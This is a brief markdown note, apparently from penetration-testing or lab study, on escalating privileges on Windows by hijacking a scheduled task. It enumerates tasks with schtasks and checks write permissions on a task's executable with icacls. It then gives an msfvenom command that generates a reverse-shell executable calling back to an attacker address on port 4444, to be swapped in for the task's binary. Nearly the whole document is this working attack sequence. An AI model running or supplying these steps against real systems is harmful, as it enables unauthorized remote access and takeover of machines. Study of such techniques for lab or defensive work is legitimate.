# Scheduled Tasks

Get a list of all the scheduled tasks on the system
```powershell
schtasks /query /fo LIST /v
```

Use icacls to check permissions on the executable
```powershell
icacls C:\Users\steve\Pictures\BackendCacheCleanup.exe
```

Then just msfvenom to create the reverse shell and upload it as the new executable
```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.235 LPORT=4444 -f exe -o reverse.exe
```
